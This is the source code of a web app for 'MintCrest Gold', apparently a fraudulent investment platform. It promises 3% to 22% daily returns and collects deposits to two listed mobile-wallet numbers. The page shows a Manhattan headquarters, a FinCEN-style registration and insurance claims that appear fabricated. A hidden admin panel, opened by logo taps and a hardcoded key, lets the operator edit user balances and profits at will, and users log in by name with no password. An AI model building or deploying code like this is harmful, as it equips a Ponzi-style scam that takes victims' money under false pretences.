<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Global VIP Vault</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #000103; color: white; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(30px); border: 1px solid rgba(255,255,255,0.07); }
        .active-tab { color: #3b82f6; border-top: 3px solid #3b82f6; background: linear-gradient(to top, rgba(59,130,246,0.1), transparent); }
        .page { display: none; animation: slideUp 0.3s ease; }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
        .badge-pending { background: rgba(234, 179, 8, 0.1); color: #eab308; padding: 2px 6px; border-radius: 4px; font-size: 7px; font-weight: 800; text-transform: uppercase; }
        .badge-approved { background: rgba(34, 197, 94, 0.1); color: #4ade80; padding: 2px 6px; border-radius: 4px; font-size: 7px; font-weight: 800; text-transform: uppercase; }
        .badge-rejected { background: rgba(239, 68, 68, 0.1); color: #ef4444; padding: 2px 6px; border-radius: 4px; font-size: 7px; font-weight: 800; text-transform: uppercase; }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .animate-marquee { display: inline-block; animation: marquee 15s linear infinite; white-space: nowrap; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <div id="promo-ticker" class="bg-blue-600/20 border-b border-blue-500/30 py-2 overflow-hidden z-[500]">
        <div id="ticker-text" class="animate-marquee text-[9px] font-black uppercase tracking-widest text-blue-400">Loading Global Market Data... Gold Assets Secured... MintCrest NYC Node Active...</div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#000103] flex items-center justify-center p-8 text-center">
        <div class="w-full max-w-sm">
            <h1 onclick="adminTap()" class="text-5xl font-black italic tracking-tighter mb-2 cursor-pointer uppercase">MINT<span class="text-blue-500">CREST</span></h1>
            <p class="text-gray-500 text-[8px] uppercase tracking-[0.4em] mb-12 font-bold italic text-blue-300">New York • London • Dubai</p>
            <div class="glass p-10 rounded-[3.5rem] border-t-2 border-blue-600 shadow-2xl">
                <input type="text" id="user-name" placeholder="Legal Full Name" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold mb-5 focus:border-blue-500 transition-all uppercase text-sm">
                <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest shadow-2xl active:scale-95 transition-all">Establish Secure Connection</button>
            </div>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        <div id="p-home" class="page active-page p-6">
            <div class="mb-4 flex justify-between items-center px-2">
                <div>
                    <p class="text-[7px] font-black text-gray-500 uppercase tracking-widest">Authorized Portfolio</p>
                    <h3 id="display-username" class="text-lg font-black italic text-blue-400 uppercase tracking-tighter">Guest</h3>
                </div>
                <div class="text-right">
                    <span class="bg-blue-500/10 text-blue-500 text-[7px] px-3 py-1 rounded-full border border-blue-500/20 font-black uppercase">Verified Node</span>
                </div>
            </div>

            <div class="glass p-10 rounded-[3rem] mb-6 border-l-8 border-blue-600 shadow-xl relative overflow-hidden">
                <div class="absolute top-0 right-0 p-4 opacity-10 text-4xl font-black italic">USA</div>
                <p class="text-[9px] text-blue-400 font-extrabold mb-1 uppercase tracking-widest">Total Asset Balance</p>
                <h2 class="text-5xl font-black tracking-tighter" id="v-bal">₨ 0</h2>
                <div id="countdown-display" class="mt-4 text-[10px] font-extrabold text-yellow-500 uppercase italic tracking-wider">Syncing Vault...</div>
                <div class="mt-6 flex gap-3">
                    <span class="text-[8px] bg-green-500/10 text-green-400 px-4 py-2 rounded-full font-bold border border-green-500/20 uppercase">Profit: <span id="v-profit">₨ 0</span></span>
                    <span id="tier-tag" class="text-[8px] bg-white/5 text-gray-400 px-4 py-2 rounded-full font-bold uppercase italic border border-white/5 italic">No Active Fleet</span>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="glass p-8 rounded-[2.5rem] text-center active:scale-95 border border-white/5">📥 <span class="text-[9px] font-black block mt-2 uppercase">Deposit</span></button>
                <button onclick="changePage('withdraw')" class="glass p-8 rounded-[2.5rem] text-center active:scale-95 border border-white/5">📤 <span class="text-[9px] font-black block mt-2 uppercase">Withdraw</span></button>
            </div>
        </div>

        <div id="p-invest" class="page p-6">
            <h2 class="text-center font-black italic mb-6 uppercase text-blue-500 text-lg tracking-widest">Active Trading Fleets</h2>
            <div id="plans-list" class="grid grid-cols-1 gap-3 pb-10"></div>
        </div>

        <div id="p-activity" class="page p-6">
            <h2 class="text-center font-black italic mb-8 uppercase text-blue-400 tracking-widest">Security Ledger</h2>
            <div id="user-history" class="space-y-2 pb-10"></div>
        </div>
        
        <div id="p-more" class="page p-6 space-y-6 pb-12">
            <div class="glass p-8 rounded-[3rem] text-center border-t-4 border-yellow-500">
                <h3 class="text-yellow-500 font-black text-[10px] uppercase mb-2">🎁 VIP Promo Activation</h3>
                <input type="text" id="user-promo-input" placeholder="ENTER PROMO CODE" class="w-full bg-white/5 p-4 rounded-2xl text-[10px] text-center font-bold mb-4 border border-yellow-500/20 outline-none uppercase">
                <button onclick="claimPromo()" class="bg-yellow-600 px-10 py-3 rounded-2xl font-black text-[9px] uppercase shadow-lg">Request Bonus</button>
            </div>

            <div class="glass p-8 rounded-[3rem] space-y-4">
                <h3 class="text-blue-500 font-black text-[10px] uppercase text-center italic tracking-widest">Company Protocol</h3>
                <details class="group">
                    <summary class="list-none cursor-pointer bg-white/5 p-4 rounded-2xl text-[9px] font-bold uppercase flex justify-between items-center">🏢 Global Headquarters <span>▼</span></summary>
                    <div class="p-4 text-[9px] text-gray-400 leading-relaxed italic border-t border-white/5 mt-2">
                        45 Rockefeller Plaza, Manhattan, New York, NY 10111, USA.<br>Registration: NY-7729-FINCEN.
                    </div>
                </details>
                <details class="group">
                    <summary class="list-none cursor-pointer bg-white/5 p-4 rounded-2xl text-[9px] font-bold uppercase flex justify-between items-center">🔐 Security <span>▼</span></summary>
                    <div class="p-4 text-[9px] text-gray-400 leading-relaxed italic border-t border-white/5 mt-2">
                        AES-256 military-grade encryption active. Transactions are insured by GLF.
                    </div>
                </details>
            </div>
            
            <button onclick="logout()" class="w-full glass p-6 rounded-[2.5rem] text-center text-[10px] font-black text-red-500 uppercase italic tracking-widest">Terminate Session</button>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] text-center border-t-8 border-blue-600 shadow-2xl">
                <h3 class="font-black text-blue-500 mb-8 uppercase text-sm italic italic">Capital Funding</h3>
                <div class="space-y-3 mb-10 text-[10px] font-black text-left">
                    <div class="glass p-5 rounded-2xl flex justify-between bg-blue-500/5"><span>JAZZCASH</span><span class="text-blue-400">03705519562</span></div>
                    <div class="glass p-5 rounded-2xl flex justify-between bg-green-500/5"><span>EASYPAISA</span><span class="text-green-400">03379827882</span></div>
                </div>
                <input type="number" id="dep-amount" placeholder="Enter Amount" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-bold border border-white/5 outline-none">
                <input type="text" id="dep-trx" placeholder="Transaction ID (TID)" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-bold uppercase border border-white/5 outline-none">
                <input type="file" id="dep-proof" class="hidden">
                <button onclick="document.getElementById('dep-proof').click()" class="w-full bg-white/5 p-4 rounded-xl mb-3 text-[8px] font-black border border-dashed border-white/20 uppercase">Upload Proof Screenshot</button>
                <button onclick="submitDeposit()" class="w-full bg-blue-600 py-6 rounded-2xl font-black text-[10px] uppercase shadow-lg">Verify Funding Request</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] border-t-8 border-red-600 text-center shadow-2xl">
                <h3 class="font-black text-red-500 mb-8 uppercase text-sm italic italic">Authorize Payout</h3>
                <input type="number" id="wd-amt" placeholder="Min Withdrawal ₨ 100" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-bold border border-white/5 outline-none">
                <input type="text" id="wd-acc" placeholder="Account Title & Number" class="w-full bg-white/5 p-5 rounded-2xl mb-8 text-center text-[9px] font-bold border border-white/5 outline-none uppercase">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-6 rounded-2xl font-black text-[10px] uppercase shadow-lg">Submit Payout Request</button>
            </div>
        </div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#000103] z-[5000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10">
            <h2 class="text-xl font-black text-blue-500 uppercase italic">Master Control</h2>
            <button onclick="closeAdmin()" class="bg-red-500/10 text-red-500 px-6 py-2 rounded-xl text-[10px] font-black">EXIT</button>
        </div>
        <div class="flex gap-2 mb-8">
            <button onclick="showAdmTab('requests')" class="bg-blue-600 flex-1 py-3 rounded-xl text-[9px] font-black uppercase">Pending Logs</button>
            <button onclick="showAdmTab('users')" class="glass flex-1 py-3 rounded-xl text-[9px] font-black uppercase">User Registry</button>
        </div>
        <div id="adm-sec-requests" class="adm-tab space-y-3"></div>
        <div id="adm-sec-users" class="adm-tab hidden space-y-3">
             <input type="text" id="user-search" onkeyup="filterUsers()" placeholder="Search Name..." class="w-full bg-white/5 p-4 rounded-xl mb-4 text-[10px] outline-none border border-white/10 font-bold">
             <div id="user-list-inner" class="space-y-2"></div>
        </div>
        <div class="glass p-8 rounded-[3rem] mt-10 border-t-2 border-green-500">
             <input type="text" id="adm-user" placeholder="Name" class="w-full bg-white/5 p-4 rounded-xl mb-2 text-center text-[10px] border border-white/10 outline-none uppercase">
             <input type="number" id="adm-val" placeholder="Amount" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-center text-[10px] border border-white/10 outline-none">
             <div class="grid grid-cols-2 gap-2">
                 <button onclick="manualEdit('balance')" class="bg-blue-600 py-3 rounded-xl font-black text-[9px] uppercase">Add Bal</button>
                 <button onclick="manualEdit('profit')" class="bg-green-600 py-3 rounded-xl font-black text-[9px] uppercase">Add Prof</button>
             </div>
        </div>
    </div>

    <nav id="bottom-nav" class="hidden glass border-t border-white/5 p-8 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200] rounded-t-[4rem]">
        <button onclick="changePage('home')" id="n-home" class="flex flex-col items-center gap-2 active-tab">🏠<span class="text-[8px] font-black uppercase mt-1">Vault</span></button>
        <button onclick="changePage('invest')" id="n-invest" class="flex flex-col items-center gap-2">📈<span class="text-[8px] font-black uppercase mt-1">Fleets</span></button>
        <button onclick="changePage('activity')" id="n-activity" class="flex flex-col items-center gap-2">📜<span class="text-[8px] font-black uppercase mt-1">Ledger</span></button>
        <button onclick="changePage('more')" id="n-more" class="flex flex-col items-center gap-2">🏢<span class="text-[8px] font-black uppercase mt-1">Firm</span></button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null; let tapCount = 0;

        const plans = [
            { n: "Micro-Elite I", p: 200, r: 3 }, { n: "Bronze-VIP", p: 2000, r: 4 },
            { n: "Silver-VIP", p: 5000, r: 4.8 }, { n: "Gold-Master", p: 15000, r: 6 },
            { n: "Diamond-VIP", p: 50000, r: 10 }, { n: "Royal Crown II", p: 200000, r: 20 },
            { n: "⚡ FLASH 24H", p: 500, r: 12, s: true }, { n: "👑 CROWN KING", p: 25000, r: 22, s: true }
        ];

        window.onload = () => { 
            const saved = localStorage.getItem('mc_user'); 
            if(saved) { document.getElementById('user-name').value = saved; login(); }
            setInterval(updateCountdown, 1000);
        };

        async function login() {
            const name = document.getElementById('user-name').value.trim().toUpperCase(); if(!name) return;
            localStorage.setItem('mc_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, activeTier: 0, tierROI: 0, lastReqTime: Date.now(), tierName: "Inactive" });
            startSync(name); 
            document.getElementById('auth-ui').style.display='none'; 
            document.getElementById('app-ui').classList.remove('hidden'); 
            document.getElementById('bottom-nav').classList.remove('hidden');
            document.getElementById('display-username').innerText = name;
            renderPlans();
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { if(doc.exists) { user = doc.data(); document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString(); document.getElementById('v-profit').innerText = "₨ " + (user.profit || 0).toLocaleString(); document.getElementById('tier-tag').innerText = user.tierName; checkProfitReq(user); } });
            db.collection("requests").where("user", "==", name).onSnapshot(snap => {
                const list = document.getElementById('user-history'); list.innerHTML = '';
                let items = []; snap.forEach(doc => items.push(doc.data())); items.sort((a,b) => b.time - a.time);
                items.forEach(d => { list.innerHTML += `<div class="glass p-5 rounded-3xl flex justify-between items-center border-l-4 border-blue-500 mb-2 text-[9px] font-black uppercase"><div>${d.type}<br><span class="opacity-30 text-[7px]">${new Date(d.time).toLocaleTimeString()}</span></div><div class="text-right">₨ ${d.amount}<br><span class="badge-${d.status}">${d.status}</span></div></div>`; });
            });
        }

        function renderPlans() {
            const list = document.getElementById('plans-list'); list.innerHTML = '';
            plans.forEach(p => { list.innerHTML += `<div onclick="buy(${p.p}, ${p.r}, '${p.n}')" class="glass p-5 rounded-[2.5rem] flex justify-between items-center active:scale-95 mb-2 border border-white/5"><div><h4 class="font-black text-[10px] uppercase ${p.s ? 'text-blue-400' : ''}">${p.n}</h4><p class="text-[8px] text-green-400 font-bold uppercase italic">${p.r}% Daily</p></div><div class="text-right font-black text-xs">₨ ${p.p.toLocaleString()}</div></div>`; });
        }

        async function submitDeposit() {
            const a = document.getElementById('dep-amount').value; const t = document.getElementById('dep-trx').value; const f = document.getElementById('dep-proof');
            if(!a || !t || !f.files[0]) return alert("Fill all details!");
            const r = new FileReader(); r.readAsDataURL(f.files[0]); r.onload = async () => {
                await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, proof: r.result, type: "deposit", status: "pending", time: Date.now() });
                alert("Deposit Logged!"); changePage('activity');
            };
        }

        async function submitWithdraw() {
            const a = document.getElementById('wd-amt').value; const acc = document.getElementById('wd-acc').value; 
            if(!a || parseInt(a) < 100 || parseInt(a) > user.balance) return alert("Invalid Balance!");
            await db.collection("requests").add({ user: user.name, amount: parseInt(a), acc: acc, type: "withdraw", status: "pending", time: Date.now() });
            await db.collection("users").doc(user.name).update({ balance: user.balance - parseInt(a) });
            alert("Payout Requested!"); changePage('activity');
        }

        async function buy(p, roi, tName) {
            if(user.balance < p) { alert("Low Funds!"); changePage('wallet'); }
            else { if(confirm("Activate "+tName+"?")) { await db.collection("users").doc(user.name).update({ balance: user.balance - p, activeTier: p, tierROI: roi, tierName: tName, lastReqTime: Date.now() }); alert("Fleet Operational!"); changePage('activity'); } }
        }

        async function claimPromo() {
            const c = document.getElementById('user-promo-input').value; if(!c) return;
            await db.collection("requests").add({ user: user.name, type: "Promo Claim", promo: c, status: "pending", time: Date.now(), amount: 0 });
            alert("Promo Sent for Verification!");
        }

        async function checkProfitReq(u) { if (u.activeTier > 0 && (Date.now() - u.lastReqTime) >= 86400000) { const amt = (u.activeTier * u.tierROI) / 100; await db.collection("requests").add({ user: u.name, amount: amt, type: "Daily Profit Yield", status: "pending", time: Date.now() }); await db.collection("users").doc(u.name).update({ lastReqTime: Date.now() }); } }
        
        function updateCountdown() {
            if (user && user.activeTier > 0) {
                const d = (user.lastReqTime + 86400000) - Date.now();
                if(d>0) { const h = Math.floor(d/3600000); const m = Math.floor((d%3600000)/60000); const s = Math.floor((d%60000)/1000); document.getElementById('countdown-display').innerText = `YIELD IN: ${h}H ${m}M ${s}S`; }
                else { document.getElementById('countdown-display').innerText = "YIELD READY"; }
            } else { document.getElementById('countdown-display').innerText = "SYSTEM IDLE"; }
        }

        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active-tab')); document.getElementById('p-'+p).classList.add('active-page'); document.getElementById('n-'+p)?.classList.add('active-tab'); }
        function logout() { localStorage.removeItem('mc_user'); location.reload(); }
        
        function adminTap() { tapCount++; if(tapCount >= 4) { if(prompt("Key:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } tapCount=0; } setTimeout(()=>tapCount=0,3000); }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }

        function syncAdmin() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                const list = document.getElementById('adm-sec-requests'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); 
                    list.innerHTML += `<div class="glass p-4 rounded-xl flex justify-between items-center text-[8px] font-black uppercase mb-2">
                        <div>${d.user}<br>Rs ${d.amount} (${d.type})</div>
                        <div class="flex gap-1">
                            ${d.proof ? `<button onclick="window.open('${d.proof}')" class="bg-blue-600 p-1">IMG</button>` : ''}
                            <button onclick="handle('${doc.id}','${d.user}',${d.amount},'approved','${d.type}')" class="bg-green-600 p-1 px-2">OK</button>
                        </div>
                    </div>`;
                });
            });
        }

        async function handle(id, u, amt, act, type) {
            const ref = db.collection("users").doc(u); const doc = await ref.get();
            if(act==='approved' && (type==='deposit'||type.includes('Profit'))) await ref.update({ balance: (doc.data().balance||0)+amt });
            await db.collection("requests").doc(id).update({ status: act });
        }

        async function manualEdit(f) { const u = document.getElementById('adm-user').value.toUpperCase(); const v = parseInt(document.getElementById('adm-val').value); await db.collection("users").doc(u).update({ [f]: v }); alert("Updated!"); }
    </script>
</body>
</html>
